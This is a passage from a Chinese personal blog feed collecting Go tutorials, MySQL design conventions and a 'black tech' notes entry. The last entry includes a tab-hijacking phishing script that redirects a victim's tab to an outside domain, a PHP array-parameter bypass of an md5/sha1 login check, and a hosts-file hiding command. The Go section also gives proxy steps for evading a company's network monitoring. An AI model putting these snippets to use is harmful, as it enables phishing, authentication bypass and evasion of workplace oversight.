Animal&#123;name:"咪咪", subject:"猫科"&#125;,age:1&#125; cat.eat("鱼") cat.sleep()&#125;输出结果： 动物喜欢吃：肉,它属于:动物科 咪咪喜欢吃：鱼,它属于:猫科 咪咪 今年1岁了,特别喜欢睡觉 ###1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071如果之前学过 PHP 或者其他语言，可以知道实现一个接口，不仅需要实现其接口里的方法，也需要使用 implements 显式说明其实现了该接口。go 则是 duck type，即像鸭子，那它就可以是个鸭子。也就是说，在 go 中，是要是结构体实现了某个接口指定的方法，那它就是实现了这个接口，不需要使用 implements 显式说明。现在说一下接口优点，最大的莫过于控制反转和解耦。举个例子，比如设计一个发送短信的服务，我想接入阿里云与腾讯云的短信业务，此时应该如何设计比较好？是在最底层通过 type 分类来区分，还是在上层通过传入不同的服务，来对应发送不同的运营商短信比较优雅？其实看 laravel 框架上的实现就很明白了。同时，go 中的多态的特性通过接口来展现的。package mainimport "fmt"type Usb interface &#123; Start() Stop()&#125;type Phone struct &#123; Name string&#125;func (p Phone) Start() &#123; p.Name = "张三" //这里对引用传递还是值传递的作用一样生效，所以这里没有变化 fmt.Println("手机开始工作了...")&#125;func (p Phone) Stop() &#123; fmt.Println(p.Name) //李四 fmt.Println("手机停止工作了...")&#125;type Carame struct &#123; Name string&#125;func (c *Carame) Start() &#123; c.Name = "张三" //这里对引用传递还是值传递的作用一样生效，所以这里有变化 fmt.Println("相机开始工作了...")&#125;func (c *Carame) Stop() &#123; fmt.Println(c.Name) //张三 fmt.Println((*c).Name) //张三 fmt.Println("相机停止工作了...")&#125;type Computer struct &#123;&#125;//Usb是前面定义的接口，这里调用的2个函数，在结构体中一定都要有声明过，否则报错。func (com *Computer) Working(usb Usb) &#123; usb.Start() usb.Stop()&#125;func main() &#123; var phone = Phone&#123;&#125; phone.Name = "李四" var carame = Carame&#123;&#125; carame.Name = "李四" var computer = Computer&#123;&#125; //这里传入参数是地址还是对象，需要依靠原结构体里定义的方法来判断(比如Phone结构体)。比如Phone结构体中的start方法是p，此时Working传入对象还是地址都可以。如果是*p，则必须传入地址。与com的类型无关。 computer.Working(&amp;phone) computer.Working(&amp;carame) //最后输出 // 手机开始工作了... // 李四 // 手机停止工作了... // 相机开始工作了... // 张三 // 相机停止工作了...&#125;https://learnku.com/golang/t/32266 面向对象特性123456789101112131415161718192021222324252627282930接口使用 interface 关键字声明，任何实现接口定义方法的类都可以实例化该接口，接口和实现类之间没有任何依赖type Sayer interface &#123; Say(message string) SayHi()&#125;继承使用组合的方式实现type Animal struct &#123; Name string&#125;func (a *Animal) Say(message string) &#123; fmt.Printf("Animal[%v] say: %v\n", a.Name, message)&#125;type Dog struct &#123; Animal&#125;Dog 将继承 Animal 的 Say 方法，以及其成员 Name子类可以重新实现父类的方法// override Animal.Sayfunc (d *Dog) Say(message string) &#123; fmt.Printf("Dog[%v] say: %v\n", d.Name, message)&#125;Dog.Say 将覆盖 Animal.Sayvar sayer Sayersayer = &amp;Dog&#123;Animal&#123;Name: "Yoda"&#125;&#125;sayer.Say("hello world") 使用 Proxy 突破网管的限制123456789101112https://gitee.com/snail/proxy为了绕开公司网络的监测，需要加密本地发往代理服务器的数据，然后由代理服务器解密数据，再发往真正的服务器，因些我们需要两级代理./proxy keygen -C proxy执行命令会在当前目录下生成 proxy.key 和 proxy.crt 两个文件，将这两个文件复制到本机的 Proxy 安装目录中在 VPS 上执行命令：./proxy socks -t tls -p ":3333" -C proxy.crt -K proxy.key --daemon --forever --log proxy.log本机打开 Proxy 安装目录中的 “bootstrap.bat” 文件，将 “proxy.exe ...” 这一行修改为：proxy.exe socks -p ":3334" -t tcp -T tls -P "IP:3333" -C proxy.crt -K proxy.key --debug其中小写 "p" 表示本机监听端口，大写 “P” 表示 VPS 端监听地址，小写 “t” 表示本机使用的传输协议，大写 “T” 表示 VPS 端使用的传输协议。保存文件后，双击 “bootstrap.bat” 即可启动 Proxy。https://learnku.com/articles/32369 go 执行系统命令时不能直接使用管道符123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960方法一（异步）func async() &#123; cmd1 := exec.Command("ls", ".") cmd2 := exec.Command("grep", "go") out, _ := cmd1.StdoutPipe() in, _ := cmd2.StdinPipe() cmd2.Stdout = os.Stdout go func() &#123; defer func() &#123; out.Close() in.Close() &#125;() io.Copy(in, out) &#125;() cmd1.Run() cmd2.Run()&#125;方法二（同步）func sync() &#123; cmd1 := exec.Command("ls", ".") cmd2 := exec.Command("grep", "go") in, _ := cmd2.StdinPipe() cmd1.Stdout = in cmd2.Stdout = os.Stdout cmd2.Start() cmd1.Run() in.Close() cmd2.Wait()&#125;方法三（多个）func main() &#123; cmd1 := exec.Command("ls", ".") cmd2 := exec.Command("grep", "go") cmd3 := exec.Command("grep", "main") cmd3.Stdout = os.Stdout pipe(cmd1, cmd2, cmd3) cmd1.Run() cmd2.Run() cmd3.Run()&#125;func pipe(cmds ...*exec.Cmd) &#123; for i, cmd := range cmds &#123; if i &gt; 0 &#123; out, _ := cmds[i-1].StdoutPipe() in, _ := cmd.StdinPipe() go func() &#123; defer func() &#123; out.Close() in.Close() &#125;() io.Copy(in, out) &#125;() &#125; &#125;&#125;https://learnku.com/articles/33592 实现一个 web 服务器1234567891011121314151617181920212223package mainimport ( "io" "log" "net/http")func main() &#123; http.HandleFunc("/hello", helloHandler) err := http.ListenAndServe(":8000", nil) if err != nil &#123; log.Fatal("ListenAndServe:", err.Error()) &#125;&#125;func helloHandler(w http.ResponseWriter, r *http.Request) &#123; io.WriteString(w, "hello, world!")&#125;$ go run hello.go$ curl http://localhost:8080/hellohello, world!https://learnku.com/golang/wikis/26652 Go 爬虫框架12345678910111213141516171819202122https://github.com/zhshch2002/goribot package mainimport ( "encoding/json" "fmt" "github.com/zhshch2002/goribot")func main() &#123; s := goribot.NewSpider() _ = s.Get(nil, "https://httpbin.org/get?Goribot%20test=hello%20world", func(r *goribot.Response) &#123; m := make(map[string]interface&#123;&#125;) err := json.Unmarshal([]byte(r.Text), &amp;m) if err != nil &#123; fmt.Println(err) &#125; fmt.Println(m) &#125;) s.Run()&#125;https://learnku.com/golang/t/33980 ###go命令行123456789101112131415161718192021go get -u github.com/cosmos72/gomacroλ gomacro.exe// GOMACRO, an interactive Go interpreter with generics and macros// Copyright (C) 2018-2019 Massimiliano Ghilardi &lt;https://github.com/cosmos72/gomacro&gt;// License MPL v2.0+: Mozilla Public License version 2.0 or later &lt;http://mozilla.org/MPL/2.0/&gt;// This is free software with ABSOLUTELY NO WARRANTY.//// Type :help for helpgomacro&gt; a:=1gomacro&gt; a1 // intgo get -u github.com/motemen/gore/cmd/gore❯ goregore version 0.4.1 :help for helpgore&gt; a := 11gore&gt; a + 23gore&gt; func Add(a, b int) int &#123; return a + b &#125;gore&gt; Add(1, 2)3 go cron 秒12345678910111213141516171819202122232425package mainimport ( "fmt" "time" "github.com/robfig/cron")func main() &#123; c := cron.New() c.AddFunc("*/1 * * * * *", func() &#123; fmt.Println("every 1 seconds executing") &#125;) go c.Start() defer c.Stop() select &#123; case &lt;-time.After(time.Second * 10): return &#125;&#125;https://learnku.com/articles/34456Github：github.com/robfig/cron Go 使用反射导出 Excel12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758type Record struct &#123; Name string `xlsx:"A-姓名"` Age int32 `xlsx:"B-年齡"`&#125;func RefactorWrite(records []*Record) &#123; xlsx := excelize.NewFile() index := xlsx.NewSheet("Sheet1") for i, t := range records &#123; d := reflect.TypeOf(t).Elem() for j := 0; j &lt; d.NumField(); j++ &#123; // 设置表头 if i == 0 &#123; column := strings.Split(d.Field(j).Tag.Get("xlsx"), "-")[0] name := strings.Split(d.Field(j).Tag.Get("xlsx"), "-")[1] xlsx.SetCellValue("Sheet1", fmt.Sprintf("%s%d", column, i+1), name) &#125; // 设置内容 column := strings.Split(d.Field(j).Tag.Get("xlsx"), "-")[0] switch d.Field(j).Type.String() &#123; case "string": xlsx.SetCellValue("Sheet1", fmt.Sprintf("%s%d", column, i+2), reflect.ValueOf(t).Elem().Field(j).String()) case "int32": xlsx.SetCellValue("Sheet1", fmt.Sprintf("%s%d", column, i+2), reflect.ValueOf(t).Elem().Field(j).Int()) case "int64": xlsx.SetCellValue("Sheet1", fmt.Sprintf("%s%d", column, i+2), reflect.ValueOf(t).Elem().Field(j).Int()) case "bool": xlsx.SetCellValue("Sheet1", fmt.Sprintf("%s%d", column, i+2), reflect.ValueOf(t).Elem().Field(j).Bool()) case "float32": xlsx.SetCellValue("Sheet1", fmt.Sprintf("%s%d", column, i+2), reflect.ValueOf(t).Elem().Field(j).Float()) case "float64": xlsx.SetCellValue("Sheet1", fmt.Sprintf("%s%d", column, i+2), reflect.ValueOf(t).Elem().Field(j).Float()) &#125; &#125; &#125; xlsx.SetActiveSheet(index) // 保存到xlsx中 err := xlsx.SaveAs("test_write.xlsx") if err != nil &#123; fmt.Println(err) &#125;&#125;func main() &#123; var records []*Record\ records = append(records, &amp;Record&#123;\ Name: "小明",\ Age: 11,\ &#125;)\ records = append(records, &amp;Record&#123;\ Name: "小华",\ Age: 12,\ &#125;)\ // 反射写\ RefactorWrite(records)&#125;https://learnku.com/articles/34635 Redis 解析工具123456789101112131415161718192021222324https://github.com/8090Lambert/go-redis-parsergo get github.com/8090Lambert/go-redis-parser$ go-redis-parser -rdb &lt;dump.rdb&gt; -o &lt;gen-file folder&gt; -type &lt;gen-file type, json or csv, default csv&gt;BigKeys 的输出示例：# Scanning the rdb file to find biggest keys-------- summary -------Sampled 6 keys in the keyspace!Total key length in bytes is 17Biggest string found 's' has 1 bytesBiggest hash found 'h' has 1 fieldsBiggest list found 'li' has 2 itemsBiggest sortedset found 'zset' has 2 membersBiggest set found 'set' has 2 membersBiggest stream found 'stream' has 3 entries1 string with 1 bytes1 hash with 1 fields1 list with 2 itemshttps://learnku.com/articles/34655 批量导出 CSDN 博客并转为 hexo 博客风格 警惕 Go 编程陷阱 golang IoC Golang 操作 Redis 的基本方法 Go Modules 不完全教程 Go 获取已插入 U 盘盘符 单元测试 一些例子和小项目 用Golang写爬虫(一) go 版本的 requests go命令行 go系列教程 beego 代码自动生成器 Go Modules 使用 文件传输管理系统Bigfile 基于 beego 的，有情怀的博客 Go 基础教程–2-基础知识 Go 语言 RESTful JSON API 创建 Golang slice 从源码来理解 golang gin + gorm + seesion 完成 Laravel 的 make:auth Golang 学习宝库 学习go语言过程中写的一些例子和小项目 Go 实现常用设计模式（十）责任链模式 Go 语言命令概览 密码学之对称加密 golang算法与数据结构 用来展示 markdown 文档的博客 【GoLang 那点事】Go 指针 go语言中的接口 Go 语言面向对象特性 如何写出优雅的 Golang 代码 内部 API 的安全 Go 语言通道原理 Golang 写爬虫 Golang 新手教程视频 golang 对接支付宝支付 Go 语言入门 敏感词匹配 使用 go 的 gin 和 gorm 框架来构建 RESTful API 微服务 httprouter 源码分析 golang算法与数据结构：走迷宫-广度优先算法 Swoole 协程与 Go 协程的区别 程序员工作以后该如何提升 Go 开发基础入门 完整视频代码及学习资料-Zinx 框架-Golang 轻量级 TCP 并发服务 go基础库之解析以逗号分隔的数据 Golang(Go语言)简明教程 Golang+gin+vue+MySQL blog https:/www.iphpt.com Go Modules 详解 markdown博客 YouTube download library and CLI written in Go 根据手机号识性别 Go 学习之路 Golang 中的面向对象继承 Laravel 博客替换成了 Go 写的博客 Go 语言 Excel 类库 Excelize Golang 中的面向对象 httprouter 源码分析 Go for PHP Developers golang 实现的泛型数组 go-Laravel-broadcast 实现 Laravel 的即时通讯 Golang 新手可能会踩的 50 个坑 使用 Go 语言的开源项目和公司 Go 如何实现 PHP 的密码加密解密 golang 实现斗地主棋牌游戏 Go 编写 Web 应用 模仿 Laravel 的项目结构和风格 HTTP 客户端 golang国内镜像 golang工具 Golang 使用 Map 奔跑的 Go Go 如何实现 PHP 的密码加密解密 GOLANG 超大文件读取的两个方案 《 刻意学习 Golang - 标准库源码分析 》 专为微服务架构定制的高性能网关 go扫盲 对 Go 语言的综合评价 miniblink+golang 开发 Windows gui 应用 通过实例入门Golang 中文:文档首页 Go Modules 详解使用 Golang 的轻量级 TCP 并发服务器框架 Golang 入门指南 用 go 的 gin 和 gorm 框架来构建 RESTful API 微服务 go语言视频教程 Golang 新手教程：入门速成指南 Go 官方包的学习 Go 语言 Excel 文档excelize Gin 学习示例代码 golang代理 go项目收集 Go语言标准库 手机归属地查询包 go beego学习 Go基础语法学习(1)]]></content>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql开发规范]]></title>
    <url>%2F2019%2F03%2F07%2Fmysql%E5%BC%80%E5%8F%91%E8%A7%84%E8%8C%83%2F</url>
    <content type="text"><![CDATA[本文来自learnku 数据命名规范所有数据库对象名称必须使用小写字母并用下划线分割。 所有数据库对象名称禁止使用 MySQL 保留关键字（如果表名中包含关键字查询时，需要将其用单引号括起来）。 数据库对象的命名要能做到见名识意，并且最后不要超过32个字符。临时库表必须以 tmp_ 为前缀并以日期为后缀，备份表必须以 bak_ 为前缀并以日期 ( 时间戳 ) 为后缀。 所有存储相同数据的列名和列类型必须一致（一般作为关联列，如果查询时关联列类型不一致会自动进行数据类型隐式转换，会造成列上的索引失效，导致查询效率降低）。数据库基本设计规范 1、所有表必须使用 InnoDB 存储引擎没有特殊要求（即 InnoDB 无法满足的功能如：列存储，存储空间数据等）的情况下，所有表必须使用 InnoDB 存储引擎（MySQL 5.5 之前默认使用 Myisam，5.6 以后默认的为 InnoDB）InnoDB 支持事务，支持行级锁，更好的恢复性，高并发下性能更好。 2、数据库和表的字符集统一使用 UTF8MB4兼容性更好，统一字符集可以避免由于字符集转换产生的乱码，不同的字符集进行比较前需要进行转换会造成索引失效。 3、所有表和字段都需要添加注释使用 comment 从句添加表和列的备注 从一开始就进行数据字典的维护。 4、尽量控制单表数据量的大小，建议控制在 500 万以内500 万并不是 MySQL 数据库的限制，过大会造成修改表结构、备份、恢复都会有很大的问题，可以用历史数据归档（应用于日志数据），分库分表（应用于业务数据）等手段来控制数据量大小。 5、谨慎使用 MySQL 分区表分区表在物理上表现为多个文件，在逻辑上表现为一个表 谨慎选择分区键，跨分区查询效率可能更低 建议采用物理分表的方式管理大数据。 6、尽量做到冷热数据分离，减小表的宽度MySQL 限制每个表最多存储 4096 列，并且每一行数据的大小不能超过 65535 字节 减少磁盘 IO，保证热数据的内存缓存命中率（表越宽，把表装载进内存缓冲池时所占用的内存也就越大,也会消耗更多的 IO） 更有效的利用缓存，避免读入无用的冷数据 经常一起使用的列放到一个表中（避免更多的关联操作） 7、禁止在表中建立预留字段预留字段的命名很难做到见名识义 预留字段无法确认存储的数据类型，所以无法选择合适的类型 对预留字段类型的修改，会对表进行锁定 8、禁止在数据库中存储图片，文件等大的二进制数据通常文件很大，会短时间内造成数据量快速增长，数据库进行数据库读取时，通常会进行大量的随机 IO 操作，文件很大时，IO 操作很耗时 通常存储于文件服务器，数据库只存储文件地址信息。。 9、禁止在线上做数据库压力测试10、禁止从开发环境，测试环境直接连接生成环境数据库数据库字段设计规范1. 优先选择符合存储需要的最小的数据类型原因列的字段越大，建立索引时所需要的空间也就越大，这样一页中所能存储的索引节点的数量也就越少也越少，在遍历时所需要的IO次数也就越多， 索引的性能也就越差 方法 1、将字符串转换成数字类型存储，如：将IP地址转换成整形数据。MySQL 提供了两个方法来处理 IP 地址 inet_aton 把ip转为无符号整型(4-8位)inet_ntoa 把整型的ip转为地址插入数据前，先用 inet_aton 把 IP 地址转为整型，可以节省空间。显示数据时，使用 inet_ntoa 把整型的 IP 地址转为地址显示即可。 2、对于非负型的数据（如自增 ID、整型 IP）来说，要优先使用无符号整型来存储,因为无符号相对于有符号可以多出一倍的存储空间。SIGNED INT -2147483648~2147483647UNSIGNED INT 0~4294967295 VARCHAR(N) 中的 N 代表的是字符数，而不是字节数。使用 UTF8 存储 255 个汉字 Varchar(255)=765 个字节。过大的长度会消耗更多的内存 2. 避免使用 TEXT、BLOB 数据类型，最常见的TEXT类型可以存储64k的数据建议把 BLOB 或是TEXT列分离到单独的扩展表中MySQL 内存临时表不支持 TEXT、BLOB 这样的大数据类型，如果查询中包含这样的数据，在排序等操作时，就不能使用内存临时表，必须使用磁盘临时表进行。 而且对于这种数据，MySQL 还是要进行二次查询，会使 SQL 性能变得很差，但是不是说一定不能使用这样的数据类型。 如果一定要使用，建议把 BLOB 或是 TEXT 列分离到单独的扩展表中，查询时一定不要使用 select * 而只需要取出必要的列，不需要 TEXT 列的数据时不要对该列进行查询。TEXT 或 BLOB 类型只能使用前缀索引因为 MySQL 对索引字段长度是有限制的，所以 TEXT 类型只能使用前缀索引，并且 TEXT 列上是不能有默认值的。 3. 避免使用 ENUM 类型修改 ENUM 值需要使用 ALTER 语句ENUM 类型的 ORDER BY 操作效率低，需要额外操作禁止使用数值作为 ENUM 的枚举值 4. 尽可能把所有列定义为 NOT NULL原因：索引 NULL 列需要额外的空间来保存，所以要占用更多的空间。进行比较和计算时要对 NULL 值做特别的处理。 5. 使用 TIMESTAMP（4 个字节）或 DATETIME 类型（8 个字节）存储时间TIMESTAMP 存储的时间范围 1970-01-01 00:00:01 ~ 2038-01-19-03:14:07。 TIMESTAMP 占用 4 字节和 INT 相同，但比 INT 可读性高，超出 TIMESTAMP 取值范围的使用 DATETIME 类型存储。 经常会有人用字符串存储日期型的数据（不正确的做法）：缺点 1：无法用日期函数进行计算和比较。缺点 2：用字符串存储日期要占用更多的空间。 6. 同财务相关的金额类数据必须使用 decimal 类型非精准浮点：float，double精准浮点：decimalDecimal 类型为精准浮点数，在计算时不会丢失精度。占用空间由定义的宽度决定，每 4 个字节可以存储 9 位数字，并且小数点要占用一个字节。可用于存储比 bigint 更大的整型数据。 索引设计规范1. 限制每张表上的索引数量，建议单张表索引不超过 5 个索引并不是越多越好！索引可以提高效率同样也可以降低效率；索引可以增加查询效率，但同样也会降低插入和更新的效率，甚至有些情况下会降低查询效率。 因为 MySQL 优化器在选择如何优化查询时，会根据统一信息，对每一个可以用到的索引来进行评估，以生成出一个最好的执行计划，如果同时有很多个索引都可以用于查询，就会增加 MySQL 优化器生成执行计划的时间，同样会降低查询性能 2. 禁止给表中的每一列都建立单独的索引5.6 版本之前，一个 SQL 只能使用到一个表中的一个索引，5.6 以后，虽然有了合并索引的优化方式，但是还是远远没有使用一个联合索引的查询方式好 3. 每个 InnoDB 表必须有个主键InnoDB 是一种索引组织表：数据的存储的逻辑顺序和索引的顺序是相同的。每个表都可以有多个索引，但是表的存储顺序只能有一种 InnoDB是按照主键索引的顺序来组织表的。 不要使用更新频繁的列作为主键，不适用多列主键（相当于联合索引） 不要使用 UUID、MD5、HASH、字符串列作为主键（无法保证数据的顺序增长）。主键建议使用自增 ID 值。常见索引列建议 出现在 SELECT、UPDATE、DELETE 语句的 WHERE 从句中的列。 包含在 ORDER BY、GROUP BY、DISTINCT 中的字段。 并不要将符合 1 和 2 中的字段的列都建立一个索引，通常将 1、2 中的字段建立联合索引效果更好。 多表 JOIN 的关联列。 如何选择索引列的顺序 建立索引的目的是：希望通过索引进行数据查找，减少随机 IO，增加查询性能 ，索引能过滤出越少的数据，则从磁盘中读入的数据也就越少。 区分度最高的放在联合索引的最左侧（区分度 = 列中不同值的数量 / 列的总行数）。尽量把字段长度小的列放在联合索引的最左侧（因为字段长度越小，一页能存储的数据量越大，IO 性能也就越好）。使用最频繁的列放到联合索引的左侧（这样可以比较少的建立一些索引）。避免建立冗余索引和重复索引 因为这样会增加查询优化器生成执行计划的时间。 重复索引示例：primary key(id)、index(id)、unique index(id) 冗余索引示例：index(a,b,c)、index(a,b)、index(a）优先考虑覆盖索引 对于频繁的查询优先考虑使用覆盖索引。 覆盖索引：就是包含了所有查询字段(where,select,ordery by,group by包含的字段)的索引 覆盖索引的好处： 避免 InnoDB 表进行索引的二次查询InnoDB 是以聚集索引的顺序来存储的，对于 InnoDB 来说，二级索引在叶子节点中所保存的是行的主键信息，如果是用二级索引查询数据的话，在查找到相应的键值后，还要通过主键进行二次查询才能获取我们真实所需要的数据。而在覆盖索引中，二级索引的键值中可以获取所有的数据，避免了对主键的二次查询 ，减少了 IO 操作，提升了查询效率。 可以把随机 IO 变成顺序 IO 加快查询效率由于覆盖索引是按键值的顺序存储的，对于 IO 密集型的范围查找来说，对比随机从磁盘读取每一行的数据 IO 要少的多，因此利用覆盖索引在访问时也可以把磁盘的随机读取的 IO 转变成索引查找的顺序 IO。索引SET规范 尽量避免使用外键约束。 不建议使用外键约束（foreign key），但一定要在表与表之间的关联键上建立索引。 外键可用于保证数据的参照完整性，但建议在业务端实现。 外键会影响父表和子表的写操作从而降低性能。 数据库SQL开发规范1. 建议使用预编译语句进行数据库操作预编译语句可以重复使用这些计划，减少 SQL 编译所需要的时间，还可以解决动态 SQL 所带来的 SQL 注入的问题 只传参数，比传递 SQL 语句更高效 相同语句可以一次解析，多次使用，提高处理效率。 2. 避免数据类型的隐式转换隐式转换会导致索引失效。如：select name,phone from customer where id = ‘111’; 3. 充分利用表上已经存在的索引避免使用双 % 号的查询条件。如a like ‘%123%’，（如果无前置 %，只有后置 %，是可以用到列上的索引的） 一个 SQL 只能利用到复合索引中的一列进行范围查询如：有 a,b,c 列的联合索引，在查询条件中有 a 列的范围查询，则在 b,c 列上的索引将不会被用到，在定义联合索引时，如果a列要用到范围查找的话，就要把 a 列放到联合索引的右侧。 使用 left join 或 not exists 来优化 not in 操作因为 not in 也通常会使用索引失效。 4. 数据库设计时，应该要对以后扩展进行考虑5. 程序连接不同的数据库使用不同的账号，进制跨库查询为数据库迁移和分库分表留出余地降低业务耦合度避免权限过大而产生的安全风险 6. 禁止使用 SELECT * 必须使用 SELECT &lt;字段列表&gt; 查询消耗更多的 CPU 和 IO 以网络带宽资源无法使用覆盖索引可减少表结构变更带来的影响 7. 禁止使用不含字段列表的 INSERT 语句如：insert into values (‘a’,’b’,’c’); 应使用：insert into t(c1,c2,c3) values (‘a’,’b’,’c’); 8. 避免使用子查询，可以把子查询优化为 JOIN 操作通常子查询在 in 子句中，且子查询中为简单 SQL ( 不包含 union、group by、order by、limit 从句 ) 时，才可以把子查询转化为关联查询进行优化。子查询性能差的原因：子查询的结果集无法使用索引，通常子查询的结果集会被存储到临时表中，不论是内存临时表还是磁盘临时表都不会存在索引，所以查询性能会受到一定的影响。特别是对于返回结果集比较大的子查询，其对查询性能的影响也就越大。由于子查询会产生大量的临时表也没有索引，所以会消耗过多的 CPU 和 IO 资源，产生大量的慢查询。 9. 避免使用 JOIN 关联太多的表对于 MySQL 来说，是存在关联缓存的，缓存的大小可以由 join_buffer_size 参数进行设置。 在 MySQL 中，对于同一个 SQL 多关联（join）一个表，就会多分配一个关联缓存，如果在一个 SQL 中关联的表越多，所占用的内存也就越大。 如果程序中大量的使用了多表关联的操作，同时 join_buffer_size 设置的也不合理的情况下，就容易造成服务器内存溢出的情况，就会影响到服务器数据库性能的稳定性。 同时对于关联操作来说，会产生临时表操作，影响查询效率 MySQL 最多允许关联 61 个表，建议不超过 5 个。 10. 减少同数据库的交互次数数据库更适合处理批量操作 合并多个相同的操作到一起，可以提高处理效率 11. 对应同一列进行 or 判断时，使用 in 代替 orIn 的值不要超过 500 个， in 操作可以更有效的利用索引，or 大多数情况下很少能利用到索引。 12. 禁止使用 order by rand() 进行随机排序会把表中所有符合条件的数据装载到内存中，然后在内存中对所有数据根据随机生成的值进行排序，并且可能会对每一行都生成一个随机值，如果满足条件的数据集非常大，就会消耗大量的 CPU 和 IO 及内存资源。 推荐在程序中获取一个随机值，然后从数据库中获取数据的方式。 13. WHERE从句中禁止对列进行函数转换和计算对列进行函数转换或计算时会导致无法使用索引。不推荐：where date(create_time)=’20190101’ 推荐：where create_time &gt;= ‘20190101’ and create_time &lt; ‘20190102’ 14. 在明显不会有重复值时使用 UNION ALL 而不是 UNIONUNION 会把两个结果集的所有数据放到临时表中后再进行去重操作。UNION ALL 不会再对结果集进行去重操作。 15. 拆分复杂的大 SQL 为多个小 SQL大 SQL：逻辑上比较复杂，需要占用大量 CPU 进行计算的SQL 。MySQL：一个 SQL 只能使用一个 CPU 进行计算。SQL 拆分后可以通过并行执行来提高处理效率。 大limitSELECT FROM table ORDER BY TIME DESC LIMIT 10000,10;这种分页方式会导致大量的 io，因为 MySQL 使用的是提前读取策略。推荐分页方式：SELECT FROM table WHERE TIME&lt;last_TIME ORDER BY TIME DESC LIMIT 10.SELECT * FROM table inner JOIN(SELECT id FROM table ORDER BY TIME LIMIT 10000,10) as t USING(id) 数据库操作行为规范1. 超 100 万行的批量写（UPDATE、DELETE、INSERT）操作，要分批多次进行操作大批量操作可能会造成严重的主从延迟主从环境中，大批量操作可能会造成严重的主从延迟，大批量的写操作一般都需要执行一定长的时间，而只有当主库上执行完成后，才会在其他从库上执行，所以会造成主库与从库长时间的延迟情况Binlog 日志为 row 格式时会产生大量的日志大批量写操作会产生大量日志，特别是对于 row 格式二进制数据而言，由于在 row 格式中会记录每一行数据的修改，我们一次修改的数据越多，产生的日志量也就会越多，日志的传输和恢复所需要的时间也就越长，这也是造成主从延迟的一个原因。避免产生大事务操作大批量修改数据，一定是在一个事务中进行的，这就会造成表中大批量数据进行锁定，从而导致大量的阻塞，阻塞会对 MySQL 的性能产生非常大的影响。特别是长时间的阻塞会占满所有数据库的可用连接，这会使生产环境中的其他应用无法连接到数据库，因此一定要注意大批量写操作要进行分批。 2. 对于大表使用 pt-online-schema-change 修改表结构避免大表修改产生的主从延迟避免在对表字段进行修改时进行锁表对大表数据结构的修改一定要谨慎，会造成严重的锁表操作，尤其是生产环境，是不能容忍的。 pt-online-schema-change 它会首先建立一个与原表结构相同的新表，并且在新表上进行表结构的修改，然后再把原表中的数据复制到新表中，并在原表中增加一些触发器。 把原表中新增的数据也复制到新表中，在行所有数据复制完成之后，把新表命名成原表，并把原来的表删除掉,把原来一个 DDL 操作，分解成多个小的批次进行。 3. 禁止为程序使用的账号赋予 super 权限当达到最大连接数限制时，还运行 1个 有 super 权限的用户连接 super 权限只能留给 DBA 处理问题的账号使用。 4. 对于程序连接数据库账号，遵循权限最小原则程序使用数据库账号只能在一个 DB 下使用，不准跨库 程序使用的账号原则上不准有 drop 权限。 修改表的默认字符集不会改表各个字段的字符集很多初学者会将 ALTER TABLE tbl_name [DEFAULT] CHARACTER SET ‘UTF8’ 误认为会修改所有字段的字符集，但实际上它只会影响后续新增的字段不会改表已有字段的字符集。如果想修改整张表所有字段的字符集建议使用 ALTER TABLE tbl_name CONVERT TO CHARACTER SET charset_name; 多条 ALTER 请求建议合为一条ALTER TABLE tbl ADD COLUMN col int, ADD INDEX idx_col (col); MySQL测试数据 SQL语句在线练习 MySQL在线测试 MySQL 避坑宝典 面试之 Memcache 相关 一份非常完整的 MySQL 规范 MySQL 社区规范 | 数据库篇 MySQL 规范 (数据库表设计规范) MySQL 规范 MongoDB教程 MongoDB 极简实践入门 mysql数据库结构优化 MySQL 配置读写分离 MySQL 细致总结之中级篇 数据库并发如何让数据操作串行化 去 BAT 面试，总结了这 55 道 MySQL 面试题！]]></content>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些黑科技]]></title>
    <url>%2F2019%2F03%2F01%2F%E9%82%A3%E4%BA%9B%E9%BB%91%E7%A7%91%E6%8A%80%2F</url>
    <content type="text"><![CDATA[远程控制地址栏12345678910111213141516171819202122232425262728293031http://675ba661.w1n.pw/41593a https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;/head&gt;&lt;body&gt;&lt;a href="https://www.baidu.com" target="baidu" id="baidu" onclick="return start()"&gt;click me&lt;/a&gt;&lt;script&gt;function start() &#123; setInterval(function() &#123; baidu.href="http://675ba661.w1n.pw/baidu"; baidu.click(); &#125;, 10000);&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;/head&gt;&lt;body&gt;&lt;a href="javascript:;" onclick="return start()"&gt;click me&lt;/a&gt;&lt;script&gt;function start() &#123; var w = window.open('https://www.baidu.com', 'baidu'); setInterval(function() &#123; w.location = 'http://675ba661.w1n.pw/baidu' &#125;, 5000)&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; PHP浮点精确度12345678910111213141516171819202122https://www.itcodemonkey.com/article/2185.htmlfloor((0.1+0.7)*10) 通常会返回 7 而不是预期中的 8，因为该结果内部的表示其实是类似 7.9999999999999991118…。?year=2016.99999999999 输出2017var_dump("0e123" == "0e456"); //truevar_dump("0e123" == "0eabc"); //flase0e123与0e456相互不严格性质比较的时候，会将0e这类字符串识为科学技术法的数字,0的无论多少次方都是零，所以相等,输出 true0e123与0eabc相互进行不严格性质比较的时候，本应该将0e这类字符串识为科学技术法的数字,但是这里的0e后面跟着的是abc,数学中科学计数的指数不可以包含字母。所以这里字符串中虽然是0e开头，但是后面的abc却不符合科学技法的规范，所以输出是 falseerror_reporting(0);$flag = 'flag&#123;I_think_that_I_just_broke_md5&#125;';if (isset($_GET['username']) and isset($_GET['password'])) &#123; if ($_GET['username'] == $_GET['password']) print 'Your password can not be your username.'; else if (md5($_GET['username']) === sha1($_GET['password'])) die($flag); else print 'Invalid password';&#125;if ($_GET['username'] == $_GET['password'])并且得满足:if (md5($_GET['username']) === sha1($_GET['password'])) ?username[]=a&amp;password[]=b 隐藏文件把hosts文件系统文件自动保护并隐藏的方法： 运行WIN+R，cmd，启动命令行以后，输入命令 ATTRIB +S +H +R HOSTS 还原为普通文件允许修改： 